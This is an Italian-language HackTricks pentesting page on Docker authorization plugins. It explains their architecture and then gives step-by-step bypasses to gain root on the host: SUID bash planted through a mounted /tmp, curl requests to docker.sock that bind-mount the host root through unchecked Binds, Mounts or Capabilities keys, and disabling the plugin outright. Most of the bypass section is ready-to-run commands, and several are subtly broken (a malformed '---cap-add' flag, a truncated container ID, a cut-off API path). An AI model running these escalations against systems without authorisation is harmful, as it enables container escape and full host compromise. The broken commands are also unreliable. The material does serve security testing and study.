{{#include ../../../banners/hacktricks-training.md}}

Il modello di **autorizzazione** di **Docker** è **tutto o niente**. Qualsiasi utente con permesso di accedere al demone Docker può **eseguire qualsiasi** comando del client Docker. Lo stesso vale per i chiamanti che utilizzano l'API Engine di Docker per contattare il demone. Se hai bisogno di **maggiore controllo degli accessi**, puoi creare **plugin di autorizzazione** e aggiungerli alla configurazione del demone Docker. Utilizzando un plugin di autorizzazione, un amministratore Docker può **configurare politiche di accesso granulari** per gestire l'accesso al demone Docker.

# Architettura di base

I plugin di autorizzazione Docker sono **plugin esterni** che puoi utilizzare per **consentire/nnegare** **azioni** richieste al demone Docker **a seconda** dell'**utente** che le ha richieste e dell'**azione** **richiesta**.

**[Le seguenti informazioni provengono dalla documentazione](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Quando viene effettuata una **richiesta HTTP** al **demone** Docker tramite la CLI o tramite l'API Engine, il **sottosistema di autenticazione** **trasmette** la richiesta ai **plugin di autenticazione** installati. La richiesta contiene l'utente (chiamante) e il contesto del comando. Il **plugin** è responsabile della decisione di **consentire** o **negare** la richiesta.

I diagrammi di sequenza qui sotto mostrano un flusso di autorizzazione di consentire e negare:

![Flusso di autorizzazione consentito](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Flusso di autorizzazione negato](https://docs.docker.com/engine/extend/images/authz_deny.png)

Ogni richiesta inviata al plugin **include l'utente autenticato, le intestazioni HTTP e il corpo della richiesta/risposta**. Solo il **nome utente** e il **metodo di autenticazione** utilizzato vengono passati al plugin. È importante notare che **nessuna** credenziale o token dell'utente vengono passati. Infine, **non tutti i corpi di richiesta/risposta vengono inviati** al plugin di autorizzazione. Solo quelli in cui il `Content-Type` è `text/*` o `application/json` vengono inviati.

Per i comandi che possono potenzialmente dirottare la connessione HTTP (`HTTP Upgrade`), come `exec`, il plugin di autorizzazione viene chiamato solo per le richieste HTTP iniziali. Una volta che il plugin approva il comando, l'autorizzazione non viene applicata al resto del flusso. In particolare, i dati in streaming non vengono passati ai plugin di autorizzazione. Per i comandi che restituiscono risposte HTTP a chunk, come `logs` ed `events`, solo la richiesta HTTP viene inviata ai plugin di autorizzazione.

Durante l'elaborazione della richiesta/risposta, alcuni flussi di autorizzazione potrebbero aver bisogno di eseguire query aggiuntive al demone Docker. Per completare tali flussi, i plugin possono chiamare l'API del demone come un utente normale. Per abilitare queste query aggiuntive, il plugin deve fornire i mezzi affinché un amministratore configuri politiche di autenticazione e sicurezza appropriate.

## Diversi Plugin

Sei responsabile della **registrazione** del tuo **plugin** come parte dell'**avvio** del demone Docker. Puoi installare **più plugin e concatenarli**. Questa catena può essere ordinata. Ogni richiesta al demone passa in ordine attraverso la catena. Solo quando **tutti i plugin concedono accesso** alla risorsa, l'accesso viene concesso.

# Esempi di Plugin

## Twistlock AuthZ Broker

Il plugin [**authz**](https://github.com/twistlock/authz) ti consente di creare un semplice file **JSON** che il **plugin** leggerà per autorizzare le richieste. Pertanto, ti offre l'opportunità di controllare molto facilmente quali endpoint API possono raggiungere ciascun utente.

Questo è un esempio che permetterà ad Alice e Bob di creare nuovi contenitori: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Nella pagina [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) puoi trovare la relazione tra l'URL richiesto e l'azione. Nella pagina [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puoi trovare la relazione tra il nome dell'azione e l'azione.

## Tutorial Plugin Semplice

Puoi trovare un **plugin facile da capire** con informazioni dettagliate su installazione e debug qui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Leggi il `README` e il codice di `plugin.go` per capire come funziona.

# Bypass del Plugin di Autenticazione Docker

## Enumerare l'accesso

Le principali cose da controllare sono **quali endpoint sono consentiti** e **quali valori di HostConfig sono consentiti**.

Per eseguire questa enumerazione puoi **utilizzare lo strumento** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## `run --privileged` non consentito

### Privilegi Minimi
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Eseguire un contenitore e poi ottenere una sessione privilegiata

In questo caso, l'amministratore di sistema **ha vietato agli utenti di montare volumi e di eseguire contenitori con il flag `--privileged`** o di dare ulteriori capacità al contenitore:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Tuttavia, un utente può **creare una shell all'interno del container in esecuzione e darle i privilegi extra**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ora, l'utente può uscire dal contenitore utilizzando una delle [**tecniche precedentemente discusse**](./#privileged-flag) e **escalare i privilegi** all'interno dell'host.

## Montare una Cartella Scrivibile

In questo caso, l'amministratore di sistema **ha vietato agli utenti di eseguire contenitori con il flag `--privileged`** o di dare qualsiasi capacità extra al contenitore, e ha solo permesso di montare la cartella `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Nota che potresti non essere in grado di montare la cartella `/tmp`, ma puoi montare una **differente cartella scrivibile**. Puoi trovare directory scrivibili usando: `find / -writable -type d 2>/dev/null`
>
> **Nota che non tutte le directory in una macchina linux supportano il bit suid!** Per controllare quali directory supportano il bit suid esegui `mount | grep -v "nosuid"` Ad esempio, di solito `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` non supportano il bit suid.
>
> Nota anche che se puoi **montare `/etc`** o qualsiasi altra cartella **contenente file di configurazione**, potresti modificarli dal container docker come root per **abusarne nell'host** e ottenere privilegi elevati (magari modificando `/etc/shadow`)

## Endpoint API non controllato

La responsabilità dell'amministratore di sistema che configura questo plugin sarebbe quella di controllare quali azioni e con quali privilegi ogni utente può eseguire. Pertanto, se l'amministratore adotta un approccio di **blacklist** con gli endpoint e gli attributi, potrebbe **dimenticarne alcuni** che potrebbero consentire a un attaccante di **escalare i privilegi.**

Puoi controllare l'API docker in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Struttura JSON non controllata

### Binds in root

È possibile che quando l'amministratore di sistema ha configurato il firewall docker, abbia **dimenticato qualche parametro importante** dell'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Binds**".\
Nell'esempio seguente è possibile abusare di questa misconfigurazione per creare ed eseguire un container che monta la cartella root (/) dell'host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Nota come in questo esempio stiamo usando il **`Binds`** param come una chiave di livello root nel JSON ma nell'API appare sotto la chiave **`HostConfig`**

### Binds in HostConfig

Segui le stesse istruzioni come con **Binds in root** eseguendo questa **richiesta** all'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Segui le stesse istruzioni di **Binds in root** eseguendo questa **richiesta** all'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Segui le stesse istruzioni di **Binds in root** eseguendo questa **richiesta** all'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Attributo JSON non controllato

È possibile che quando l'amministratore di sistema ha configurato il firewall di docker **si sia dimenticato di qualche attributo importante di un parametro** dell'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Capabilities**" all'interno di "**HostConfig**". Nel seguente esempio è possibile abusare di questa misconfigurazione per creare ed eseguire un container con la capacità **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> Il **`HostConfig`** è la chiave che di solito contiene i **privilegi** **interessanti** per sfuggire dal container. Tuttavia, come abbiamo discusso in precedenza, nota come l'uso di Binds al di fuori di esso funzioni anche e possa permetterti di aggirare le restrizioni.

## Disabilitare il Plugin

Se il **sysadmin** si è **dimenticato** di **vietare** la possibilità di **disabilitare** il **plugin**, puoi approfittarne per disabilitarlo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Ricorda di **riattivare il plugin dopo l'escalation**, o un **riavvio del servizio docker non funzionerà**!

## Scritture di bypass del plugin di autenticazione

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
